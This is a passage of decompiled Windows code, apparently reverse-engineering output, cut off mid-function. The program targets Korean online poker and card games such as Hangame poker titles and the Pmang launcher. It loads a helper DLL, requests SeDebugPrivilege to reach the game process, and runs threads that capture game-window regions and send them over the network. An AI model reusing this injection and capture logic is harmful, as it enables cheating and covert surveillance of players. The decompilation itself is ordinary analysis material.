    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct CatchGuardRN CatchGuardRN, *PCatchGuardRN;

struct CatchGuardRN { // PlaceHolder Structure
};

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct IAtlMemMgr IAtlMemMgr, *PIAtlMemMgr;

struct IAtlMemMgr { // PlaceHolder Structure
};

typedef struct CAtlBaseModule CAtlBaseModule, *PCAtlBaseModule;

struct CAtlBaseModule { // PlaceHolder Structure
};

typedef struct CWin32Heap CWin32Heap, *PCWin32Heap;

struct CWin32Heap { // PlaceHolder Structure
};

typedef struct CStringData CStringData, *PCStringData;

struct CStringData { // PlaceHolder Structure
};

typedef struct CAtlStringMgr CAtlStringMgr, *PCAtlStringMgr;

struct CAtlStringMgr { // PlaceHolder Structure
};

typedef struct _LDBL12 _LDBL12, *P_LDBL12;

struct _LDBL12 {
    uchar ld12[12];
};

typedef struct _CRT_FLOAT _CRT_FLOAT, *P_CRT_FLOAT;

struct _CRT_FLOAT {
    float f;
};

typedef struct _CRT_DOUBLE _CRT_DOUBLE, *P_CRT_DOUBLE;

struct _CRT_DOUBLE {
    double x;
};

typedef int (*_onexit_t)(void);

typedef ushort wint_t;

typedef uint size_t;

typedef size_t rsize_t;

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef ushort wctype_t;




undefined4 FUN_00401000(LPCWSTR param_1,undefined4 param_2)

{
  if (DAT_0044e2b8 == (HMODULE)0x0) {
    DAT_0044e2b8 = LoadLibraryW(param_1);
    if (DAT_0044e2b8 == (HMODULE)0x0) {
      return 0;
    }
  }
  if ((((((DAT_0044e2bc != (FARPROC)0x0) ||
         (DAT_0044e2bc = GetProcAddress(DAT_0044e2b8,"SetParentId"), DAT_0044e2bc != (FARPROC)0x0))
        && ((DAT_0044e2c0 != (FARPROC)0x0 ||
            (DAT_0044e2c0 = GetProcAddress(DAT_0044e2b8,"SetCommand"), DAT_0044e2c0 != (FARPROC)0x0)
            ))) &&
       ((DAT_0044e2c4 != (FARPROC)0x0 ||
        (DAT_0044e2c4 = GetProcAddress(DAT_0044e2b8,"SetGameId"), DAT_0044e2c4 != (FARPROC)0x0))))
      && ((DAT_0044e2c8 != (FARPROC)0x0 ||
          (DAT_0044e2c8 = GetProcAddress(DAT_0044e2b8,"GetDllDataLen"), DAT_0044e2c8 != (FARPROC)0x0
          )))) &&
     ((DAT_0044e2cc != (FARPROC)0x0 ||
      (DAT_0044e2cc = GetProcAddress(DAT_0044e2b8,"GetDllData"), DAT_0044e2cc != (FARPROC)0x0)))) {
    if (DAT_0044e2bc != (FARPROC)0x0) {
      (*DAT_0044e2bc)(param_2);
    }
    FUN_004010f0(0);
    return 1;
  }
  return 0;
}



undefined4 __fastcall FUN_004010f0(undefined4 param_1)

{
  if (DAT_0044e2c0 != (code *)0x0) {
    (*DAT_0044e2c0)(param_1);
    return 1;
  }
  return 0;
}



undefined4 FUN_00401110(undefined4 param_1)

{
  short *psVar1;
  short sVar2;
  int iVar3;
  tagMSG local_1c;
  
  iVar3 = 0;
  do {
    sVar2 = *(short *)((int)L"Aproc" + iVar3);
    *(short *)((int)&DAT_0042dd18 + iVar3) = sVar2;
    iVar3 = iVar3 + 2;
  } while (sVar2 != 0);
  iVar3 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00426908 + iVar3);
    *(short *)((int)&DAT_0042dc50 + iVar3) = *psVar1;
    iVar3 = iVar3 + 2;
  } while (*psVar1 != 0);
  FUN_004011e0();
  iVar3 = FUN_00401270();
  if (iVar3 == 0) {
    return 0;
  }
  iVar3 = GetMessageW(&local_1c,(HWND)0x0,0,0);
  while (iVar3 != 0) {
    iVar3 = TranslateAcceleratorW(local_1c.hwnd,(HACCEL)0x0,&local_1c);
    if (iVar3 == 0) {
      TranslateMessage(&local_1c);
      DispatchMessageW(&local_1c);
    }
    iVar3 = GetMessageW(&local_1c,(HWND)0x0,0,0);
  }
  return local_1c.wParam;
}



void FUN_004011e0(void)

{
  HINSTANCE in_EAX;
  WNDCLASSEXW local_30;
  
  local_30.cbSize = 0x30;
  local_30.style = 3;
  local_30.lpfnWndProc = FUN_00401530;
  local_30.cbClsExtra = 0;
  local_30.cbWndExtra = 0;
  local_30.hInstance = in_EAX;
  local_30.hIcon = LoadIconW(in_EAX,(LPCWSTR)0x6b);
  local_30.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_30.hbrBackground = (HBRUSH)0x6;
  local_30.lpszMenuName = (LPCWSTR)0x0;
  local_30.lpszClassName = &DAT_0042dc50;
  local_30.hIconSm = LoadIconW(local_30.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_30);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00401270(void)

{
  short *psVar1;
  short sVar2;
  HINSTANCE in_EAX;
  HWND pHVar3;
  int iVar4;
  HMODULE hModule;
  FARPROC pFVar5;
  HANDLE pvVar6;
  undefined4 uVar7;
  char *lpProcName;
  undefined4 *puVar8;
  undefined4 uStack_4;
  
  _DAT_0042dde0 = in_EAX;
  pHVar3 = CreateWindowExW(0,&DAT_0042dc50,&DAT_0042dd18,0xcf0000,-0x80000000,0,-0x80000000,0,
                           (HWND)0x0,(HMENU)0x0,in_EAX,(LPVOID)0x0);
  if (pHVar3 != (HWND)0x0) {
    _wcscpy_s((wchar_t *)&DAT_0042c454,0x40,L"highlow2.exe");
    _wcscpy_s((wchar_t *)&DAT_0042c954,0x40,L"하이로우2");
    _wcscpy_s((wchar_t *)&DAT_0042c4d4,0x40,L"LASPOKER.exe");
    _wcscpy_s((wchar_t *)&DAT_0042c9d4,0x40,L"한게임 라스베가스 포커");
    _wcscpy_s((wchar_t *)&DAT_0042c554,0x40,L"poker7.exe");
    _wcscpy_s((wchar_t *)&DAT_0042ca54,0x40,L"한게임 7포커");
    _wcscpy_s((wchar_t *)&DAT_0042c5d4,0x40,L"Baduki.exe");
    _wcscpy_s((wchar_t *)&DAT_0042cad4,0x40,L"한게임 로우바둑이");
    _wcscpy_s((wchar_t *)&DAT_0042c654,0x40,L"HOOLA3.exe");
    _wcscpy_s((wchar_t *)&DAT_0042cb54,0x40,L"한게임 파티훌라");
    _wcscpy_s((wchar_t *)&DAT_0042c6d4,0x40,L"DuelPoker.exe");
    _wcscpy_s((wchar_t *)&DAT_0042cbd4,0x40,L"한게임 맞포커");
    _wcscpy_s((wchar_t *)&DAT_0042c754,0x40,L"PMLauncher.exe");
    _wcscpy_s((wchar_t *)&DAT_0042cc54,0x40,L"피망 게임");
    _wcscpy_s((wchar_t *)&DAT_0042c7d4,0x40,L"_PMLauncher.exe");
    _wcscpy_s((wchar_t *)&DAT_0042ccd4,0x40,L"피망 게임");
    _wcscpy_s((wchar_t *)&DAT_0042c854,0x40,L"Newbadugi.exe");
    _wcscpy_s((wchar_t *)&DAT_0042cd54,0x40,L"로우바둑이");
    DAT_0042c450 = 9;
    _memset(&DAT_0044dde8,0,0x100);
    iVar4 = 0;
    do {
      psVar1 = (short *)((int)&DAT_00426a94 + iVar4);
      *(short *)((int)&DAT_0044ddec + iVar4) = *psVar1;
      iVar4 = iVar4 + 2;
    } while (*psVar1 != 0);
    iVar4 = 0;
    do {
      psVar1 = (short *)((int)&DAT_00426a98 + iVar4);
      *(short *)((int)&DAT_0044de1c + iVar4) = *psVar1;
      iVar4 = iVar4 + 2;
    } while (*psVar1 != 0);
    iVar4 = 0;
    do {
      psVar1 = (short *)((int)&DAT_00426aa4 + iVar4);
      *(short *)((int)&DAT_0044ddf0 + iVar4) = *psVar1;
      iVar4 = iVar4 + 2;
    } while (*psVar1 != 0);
    DAT_0044de18 = 0x51;
    iVar4 = 0;
    do {
      sVar2 = *(short *)((int)L"MyCom" + iVar4);
      *(short *)((int)&DAT_0044de3a + iVar4) = sVar2;
      iVar4 = iVar4 + 2;
    } while (sVar2 != 0);
    DAT_0044ded4 = 5;
    DAT_0044dedc = 0x32;
    _DAT_0042ce54 = FUN_004029e0();
    lpProcName = "IsWow64Process";
    uStack_4 = 0;
    DAT_0044e0f0 = _DAT_0042ce54;
    hModule = GetModuleHandleW(L"kernel32");
    pFVar5 = GetProcAddress(hModule,lpProcName);
    uVar7 = uStack_4;
    if (pFVar5 != (FARPROC)0x0) {
      puVar8 = &uStack_4;
      pvVar6 = GetCurrentProcess();
      iVar4 = (*pFVar5)(pvVar6,puVar8);
      uVar7 = uStack_4;
      if (iVar4 != 1) {
        uVar7 = 0;
      }
    }
    _DAT_0042ce58 = uVar7;
    FUN_00402870();
    _DAT_0046eaf2 = FUN_004021d0;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_004015f0,(LPVOID)0x0,0,(LPDWORD)0x0);
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401a30,(LPVOID)0x0,0,(LPDWORD)0x0);
    return 1;
  }
  return 0;
}



void FUN_00401530(HWND param_1,UINT param_2,WPARAM param_3,LPARAM param_4)

{
  undefined auStack_54 [4];
  tagPAINTSTRUCT local_50;
  uint local_c;
  
  local_c = DAT_0042b0a0 ^ (uint)auStack_54;
  if (param_2 == 2) {
    PostQuitMessage(0);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  if (param_2 != 0xf) {
    if (param_2 != 0x111) {
      DefWindowProcW(param_1,param_2,param_3,param_4);
      ___security_check_cookie_4(local_c ^ (uint)auStack_54);
      return;
    }
    DefWindowProcW(param_1,0x111,param_3,param_4);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  BeginPaint(param_1,&local_50);
  EndPaint(param_1,&local_50);
  ___security_check_cookie_4(local_c ^ (uint)auStack_54);
  return;
}



void FUN_004015f0(void)

{
  do {
    Sleep(1000);
    FUN_00401610();
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401610(void)

{
  short *psVar1;
  short sVar2;
  int iVar3;
  int iVar4;
  undefined4 *puVar5;
  DWORD DVar6;
  HANDLE ProcessHandle;
  BOOL BVar7;
  undefined4 *puVar8;
  uint uVar9;
  void *this;
  HANDLE *TokenHandle;
  undefined auStack_29c [4];
  HANDLE pvStack_298;
  undefined local_294 [8];
  undefined4 local_28c;
  undefined4 local_288;
  undefined4 local_284;
  undefined2 local_280;
  undefined auStack_27e [114];
  undefined4 local_20c;
  undefined4 local_208;
  undefined4 local_204;
  undefined2 local_200;
  undefined local_1fe [114];
  undefined4 local_18c;
  undefined4 local_188;
  undefined4 local_184;
  undefined2 local_180;
  undefined local_17e [114];
  undefined4 local_10c;
  undefined4 local_108;
  undefined4 local_104;
  undefined4 local_100;
  undefined local_fc [112];
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined2 local_7c;
  undefined local_7a [114];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)auStack_29c;
  iVar3 = FUN_00402f50(&DAT_0042c450);
  uVar9 = DAT_0042ce5c;
  if (iVar3 != 0) {
    if ((DAT_0042ce5c != 6) && (DAT_0042ce5c != 7)) {
      DAT_0042c440 = DAT_0042ce5c;
      iVar3 = 0;
      do {
        psVar1 = (short *)((int)&DAT_0042ce64 + iVar3);
        *(short *)((int)&DAT_0044e0f8 + iVar3) = *psVar1;
        iVar3 = iVar3 + 2;
      } while (*psVar1 != 0);
      iVar3 = 0;
      do {
        psVar1 = (short *)((int)&DAT_0042cee8 + iVar3);
        *(short *)((int)&DAT_0044e178 + iVar3) = *psVar1;
        iVar3 = iVar3 + 2;
      } while (*psVar1 != 0);
      goto LAB_0040183b;
    }
    local_28c = 0xb9ddd53c;
    local_288 = 0x370020;
    local_284 = 0xcee4d3ec;
    local_280 = 0;
    _memset(auStack_27e,0,0x72);
    local_208 = 0x350020;
    local_20c = 0xb9ddd53c;
    local_204 = 0xcee4d3ec;
    local_200 = 0;
    _memset(local_1fe,0,0x72);
    local_188 = 0xb2740020;
    local_18c = 0xb9ddd53c;
    local_184 = 0xcee4d3ec;
    local_180 = 0;
    _memset(local_17e,0,0x72);
    local_108 = 0xd5580020;
    local_10c = 0xb9ddd53c;
    local_104 = 0xb85cc774;
    local_100 = 0xc6b0;
    _memset(local_fc,0,0x70);
    local_88 = 0xb85c0020;
    local_84 = 0xbc14c6b0;
    local_8c = 0xb9ddd53c;
    local_80 = 0xc774b451;
    local_7c = 0;
    _memset(local_7a,0,0x6e);
    iVar3 = 0;
    puVar8 = &local_28c;
    do {
      iVar4 = FUN_00403080(puVar8);
      if (iVar4 != 0) {
        puVar8 = &local_28c + iVar3 * 0x20;
        iVar4 = (int)&DAT_0044e178 - (int)puVar8;
        do {
          sVar2 = *(short *)puVar8;
          *(short *)(iVar4 + (int)puVar8) = sVar2;
          puVar8 = (undefined4 *)((int)puVar8 + 2);
        } while (sVar2 != 0);
        uVar9 = 6;
        DAT_0042c440 = 6;
        iVar4 = 0;
        do {
          psVar1 = (short *)((int)&DAT_0042ce64 + iVar4);
          *(short *)((int)&DAT_0044e0f8 + iVar4) = *psVar1;
          iVar4 = iVar4 + 2;
          _DAT_0042c444 = iVar3;
        } while (*psVar1 != 0);
        goto LAB_0040183b;
      }
      iVar3 = iVar3 + 1;
      puVar8 = puVar8 + 0x20;
    } while (iVar3 < 5);
  }
  uVar9 = 0xffffffff;
  DAT_0042c440 = 0xffffffff;
  DAT_0044e288 = 0;
LAB_0040183b:
  if (DAT_0044e0f0 == 3) {
    if (uVar9 < 6) {
      if (DAT_0044e288 == 0) {
        local_294._0_4_ = 0;
        this = (void *)0x0;
        local_28c = local_28c & 0xffff0000;
        _memset((void *)((int)&local_28c + 2),0,0x206);
        FUN_00402ae0();
        puVar8 = (undefined4 *)(local_294 + 6);
        do {
          puVar5 = puVar8;
          puVar8 = (undefined4 *)((int)puVar5 + 2);
        } while (*(short *)((int)puVar5 + 2) != 0);
        *(undefined4 *)((int)puVar5 + 2) = 0x48005c;
        *(undefined **)((int)puVar5 + 6) = &DAT_00440047;
        *(undefined4 *)((int)puVar5 + 10) = 0x610072;
        *(undefined4 *)((int)puVar5 + 0xe) = 0x2e0077;
        *(undefined4 *)((int)puVar5 + 0x12) = 0x6c0064;
        *(undefined4 *)((int)puVar5 + 0x16) = 0x6c;
        DVar6 = GetFileAttributesW((LPCWSTR)&local_28c);
        if ((DVar6 != 0xffffffff) ||
           (((this = FUN_00402b40((DWORD *)local_294), this != (void *)0x0 &&
             (9 < (int)local_294._0_4_)) &&
            (iVar3 = FUN_00404730(this,(wchar_t *)&local_28c), iVar3 == 0)))) {
          DVar6 = GetCurrentProcessId();
          iVar3 = FUN_00401000((LPCWSTR)&local_28c,DVar6);
          if (iVar3 != 0) {
            if (this != (void *)0x0) {
              FUN_0040fb79(this);
            }
            TokenHandle = &pvStack_298;
            DVar6 = 0x28;
            pvStack_298 = (HANDLE)0x0;
            ProcessHandle = GetCurrentProcess();
            BVar7 = OpenProcessToken(ProcessHandle,DVar6,TokenHandle);
            if ((BVar7 != 0) &&
               (BVar7 = LookupPrivilegeValueW((LPCWSTR)0x0,L"SeDebugPrivilege",(PLUID)local_294),
               BVar7 != 0)) {
              FUN_00403450();
            }
            if (pvStack_298 != (HANDLE)0x0) {
              CloseHandle(pvStack_298);
            }
            DVar6 = FUN_004032f0(DAT_0042ce60);
            if (DVar6 == 0) {
              DAT_0044e288 = DAT_0042ce60;
            }
          }
        }
      }
    }
    else {
      DAT_0044e288 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)auStack_29c);
  return;
}



void FUN_00401a30(void)

{
  do {
    Sleep(0x32);
    FUN_00401a50();
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401a50(void)

{
  short *psVar1;
  short sVar2;
  void **ppvVar3;
  bool bVar4;
  int iVar5;
  DWORD DVar6;
  int iVar7;
  wchar_t *pwVar8;
  undefined3 extraout_var;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 uVar9;
  undefined4 *puVar10;
  undefined4 *puVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  undefined auStack_3e0 [4];
  undefined4 uStack_3dc;
  undefined4 auStack_3d0 [6];
  undefined4 uStack_3b8;
  short asStack_3b4 [30];
  short asStack_378 [45];
  short asStack_31e [32];
  short asStack_2de [365];
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)auStack_3e0;
  if (((int)DAT_0042c440 < 0) || (DAT_0042c450 < (int)DAT_0042c440)) {
    DAT_0044dde8 = 0;
    _DAT_0044dee4 = GetTickCount();
    if (2 < DAT_0044e2e6) {
      if ((DAT_0044e2e2 != 0) && (iVar5 = Ordinal_3(DAT_0044e2e2), iVar5 == 0)) {
        DAT_0044e2e2 = 0;
      }
      DAT_0044e2e6 = 1;
    }
    goto LAB_004021aa;
  }
  if (DAT_0044e2e6 == 1) {
    DAT_0044dde8 = 0;
    iVar5 = FUN_00404380();
    if (iVar5 == 0) {
      Sleep(5000);
    }
    else {
      DAT_0044dde8 = 1;
      _DAT_0044dee4 = GetTickCount();
      Sleep(1000);
    }
    goto LAB_004021aa;
  }
  iVar5 = FUN_00403080(&DAT_0044e178);
  if (iVar5 == 0) {
    DAT_0044e278 = 0;
    DAT_0044e27c = 0;
    DAT_0044e280 = 0;
    DAT_0044e284 = 0;
    goto LAB_004021aa;
  }
  DAT_0044e280 = DAT_0042cf70;
  DAT_0044e278 = DAT_0042cf68;
  DAT_0044e27c = DAT_0042cf6c;
  DAT_0044e284 = DAT_0042cf74;
  DAT_0044e0f4 = DAT_0042cee4;
  _memset(auStack_3d0,0,0x3c6);
  if (DAT_0044dde8 == 1) {
    iVar5 = 0;
    do {
      sVar2 = *(short *)((int)&DAT_0044ddec + iVar5);
      *(short *)((int)asStack_31e + iVar5) = sVar2;
      iVar5 = iVar5 + 2;
    } while (sVar2 != 0);
    iVar5 = 0;
    do {
      sVar2 = *(short *)((int)&DAT_0044de3a + iVar5);
      *(short *)((int)asStack_2de + iVar5) = sVar2;
      iVar5 = iVar5 + 2;
    } while (sVar2 != 0);
    iVar5 = 0;
    do {
      sVar2 = *(short *)((int)&DAT_0044de1c + iVar5);
      *(short *)((int)asStack_31e + iVar5 + 4) = sVar2;
      iVar5 = iVar5 + 2;
    } while (sVar2 != 0);
    DAT_0043ddec._0_1_ = 0;
    _DAT_0043dde8 = 0x30303039;
    puVar10 = auStack_3d0;
    puVar11 = (undefined4 *)&DAT_0043ddec;
    for (iVar5 = 0xf1; iVar5 != 0; iVar5 = iVar5 + -1) {
      *puVar11 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar11 = puVar11 + 1;
    }
    *(undefined2 *)puVar11 = *(undefined2 *)puVar10;
    DAT_0042c448 = 0x3ca;
    FUN_00404480(&DAT_0043dde8,1);
    DAT_0044dde8 = 2;
    _DAT_0044dee4 = GetTickCount();
    goto LAB_004021aa;
  }
  if (DAT_0044dde8 == 2) {
    DVar6 = GetTickCount();
    if (5000 < DVar6 - _DAT_0044dee4) {
      DAT_0044dde8 = 0;
      _DAT_0044dee4 = GetTickCount();
      FUN_00404450();
    }
    goto LAB_004021aa;
  }
  if (DAT_0044dde8 == 3) {
    DVar6 = GetTickCount();
    if (1000 < DVar6 - _DAT_0044dee4) {
      iVar7 = 0xb4;
      iVar5 = 0x82;
      if (DAT_0042c440 == 6) {
        iVar7 = 800;
        iVar5 = 0x32;
      }
      iVar5 = FUN_004030f0(&DAT_0042c450,DAT_0044e278,DAT_0044e27c,DAT_0044e280,DAT_0044e284,iVar7,
                           iVar5);
      if (iVar5 == 0) {
        iVar5 = 0;
        do {
          psVar1 = (short *)((int)&DAT_00426bb8 + iVar5);
          *(short *)((int)&DAT_0044e1f8 + iVar5) = *psVar1;
          iVar5 = iVar5 + 2;
        } while (*psVar1 != 0);
      }
      else if (DAT_0042c440 < 6) {
        pwVar8 = _wcsstr(&DAT_0042cf78,L"경기장");
        if (pwVar8 == (wchar_t *)0x0) {
          pwVar8 = _wcsstr(&DAT_0042cf78,L"game");
          if (pwVar8 != (wchar_t *)0x0) {
            uStack_3b8 = 1;
          }
        }
        else {
          iVar5 = 0;
          do {
            psVar1 = (short *)((int)&DAT_0042cf78 + iVar5);
            *(short *)((int)&DAT_0044e1f8 + iVar5) = *psVar1;
            iVar5 = iVar5 + 2;
          } while (*psVar1 != 0);
        }
      }
      else if (DAT_0042c440 == 6) {
        iVar5 = 0;
        do {
          psVar1 = (short *)((int)&DAT_0042cf78 + iVar5);
          *(short *)((int)&DAT_0044e1f8 + iVar5) = *psVar1;
          iVar5 = iVar5 + 2;
        } while (*psVar1 != 0);
      }
      _DAT_0044dee4 = GetTickCount();
      DAT_0043ddec._0_1_ = 0;
      _DAT_0043dde8 = 0x34303036;
      iVar5 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_0044e178 + iVar5);
        *(short *)((int)asStack_3b4 + iVar5) = sVar2;
        iVar5 = iVar5 + 2;
      } while (sVar2 != 0);
      iVar5 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_0044e1f8 + iVar5);
        *(short *)((int)asStack_378 + iVar5) = sVar2;
        iVar5 = iVar5 + 2;
      } while (sVar2 != 0);
      puVar10 = auStack_3d0;
      puVar11 = (undefined4 *)&DAT_0043ddec;
      for (iVar5 = 0xf1; iVar5 != 0; iVar5 = iVar5 + -1) {
        *puVar11 = *puVar10;
        puVar10 = puVar10 + 1;
        puVar11 = puVar11 + 1;
      }
      *(undefined2 *)puVar11 = *(undefined2 *)puVar10;
      DAT_0042c448 = 0x3ca;
      FUN_00404480(&DAT_0043dde8,1);
    }
    goto LAB_004021aa;
  }
  if ((DAT_0044dde8 != 4) ||
     (DVar6 = GetTickCount(), DVar6 - _DAT_0044dee4 <= (uint)(1000 / (longlong)DAT_0044ded4)))
  goto LAB_004021aa;
  uStack_3dc = 0;
  iVar5 = DAT_0044e278;
  iVar7 = DAT_0044e27c;
  iVar12 = DAT_0044e280;
  iVar13 = DAT_0044e284;
  if (DAT_0042c440 == 6) {
LAB_00401ec7:
    bVar4 = FUN_00403850(&DAT_0044e2a8,iVar5,iVar7,iVar12,iVar13);
    ppvVar3 = DAT_0044e2a8;
    if ((CONCAT31(extraout_var,bVar4) == 0) || (DAT_0044e2a8 == (void **)0x0)) goto LAB_004021aa;
    if (DAT_0042c440 == 0) {
      FUN_00402be0(&DAT_0044e290,DAT_0044e2a8,(void *)0x10e,(void *)0x0,(void *)0x140,(void *)0xd0);
      iVar14 = 0x14;
      iVar13 = 0xbc;
      iVar12 = 0x140;
      iVar7 = 0x21c;
      iVar5 = 0x104;
      uVar9 = extraout_ECX;
    }
    else if (DAT_0042c440 == 1) {
      FUN_00402be0(&DAT_0044e290,DAT_0044e2a8,(void *)0x64,(void *)0x0,(void *)0x140,(void *)0xd0);
      iVar14 = 0x14;
      iVar13 = 0xbc;
      iVar12 = 0x140;
      iVar7 = 0x203;
      iVar5 = 0xe6;
      uVar9 = extraout_ECX_00;
    }
    else if ((DAT_0042c440 == 2) || (DAT_0042c440 == 3)) {
